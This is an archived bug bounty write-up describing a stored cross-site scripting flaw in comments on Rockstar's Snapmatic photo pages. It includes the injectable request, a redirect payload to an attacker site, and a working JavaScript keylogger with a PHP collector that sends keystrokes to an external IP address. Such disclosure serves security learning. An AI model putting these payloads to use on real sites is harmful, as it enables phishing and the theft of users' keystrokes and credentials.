---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-26_stored-xss-on-rockstar-game.md
original_filename: 2017-07-26_stored-xss-on-rockstar-game.md
title: Stored XSS on Rockstar Game
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
language: en
raw_sha256: 5d24b01a91c14c0ecb3ef7431b7ff56e28cc3721bf91da0868760c2610542c33
text_sha256: 99ad8057194a79cd59e734a913dfae0877c31eabb42d6dd426e4c1d44aa53a24
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS on Rockstar Game

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-26_stored-xss-on-rockstar-game.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `5d24b01a91c14c0ecb3ef7431b7ff56e28cc3721bf91da0868760c2610542c33`
- Text SHA256: `99ad8057194a79cd59e734a913dfae0877c31eabb42d6dd426e4c1d44aa53a24`


## Content

---
title: "Stored XSS on Rockstar Game"
url: "https://medium.com/@arbazhussain/stored-xss-on-rockstar-game-c008ec18d071"
authors: ["Arbaz Hussain (@ArbazKiraak)"]
programs: ["Rockstar Games"]
bugs: ["XSS"]
bounty: "1,000"
publication_date: "2017-07-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6141
scraped_via: "browseros"
---

# Stored XSS on Rockstar Game

Stored XSS on Rockstar Game
Arbaz Hussain
Follow
2 min read
·
Jul 26, 2017

295

Severity: High

Complexity : Easy

Weakness : Cross Site Scripting

Get Arbaz Hussain’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Date : Nov 2016

Rockstar’s Current Game GTA V have a feature Snapmatic which is a app in game to take picture’s while playing and it get’s uploaded at socialclub.rockstargames.com

https://socialclub.rockstargames.com/games/gtav/pc/snapmatic

Other’s users of rockstar games have ability to view and comment on snapmatic picture’s .
Vulnerability was while commenting on snapmatic picture’s they were not filtering malicious tags / javascript .
Press enter or click to view image in full size
POST /games/gtav/snapmatic/ajax/comment HTTP/1.1
Host: socialclub.rockstargames.com
Connection: close
Content-Length: 57
Accept: application/json, text/javascript, */*; q=0.01
RequestVerificationToken: REDACTEDTOKEN
Origin: https://socialclub.rockstargames.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/json
Referer: https://socialclub.rockstargames.com/games/gtav/snapmatic/mostrecent/photo/zVqgrrjUl0q8tRsmDvMi0w
Accept-Language: en-US,en;q=0.8
Cookie: csrf:token<REDACTED>
{"ugcId":"PICTUREID","comment":"PAYLOAD HERE"}
I Used the Basic payload to check the response & got script popup.
Press enter or click to view image in full size
Worst Scenario is Script was directly getting executed in background when viewing images from https://socialclub.rockstargames.com/games/gtav/pc/snapmatic that might be because of rendering the first comment’s .
To Increase the impact i tried to find ways to make other user’s to comment payload on snapmatic images’s just like a WORM using ajax call’s but unfortunately they were using extra protection for csrf checking as you can see from above request.
As payload is getting render directly on main page /snapmatic
We can redirect all the user’s visiting /snapmatic to attacker choice url just like phishing .
<script>window.onload = window.location.href= ‘https://attacker.com';</script>
Or By adding a Keylogger :
Keylog.js
document.onkeypress = function(evt) {
  evt = evt || window.event
  key = String.fromCharCode(evt.charCode)
  if (key) {
  var http = new XMLHttpRequest();
  var param = encodeURI(key)
  http.open("POST","http://52.61.158.123/keylog/keylog.php",true);
  http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  http.send("key="+param);
  }
  }
Keylog.php
<?php
$key=$_POST['key'];
$logfile="keylog.txt";
$fp = fopen($logfile, "a");
fwrite($fp, $key);
fclose($fp);
?>
Press enter or click to view image in full size
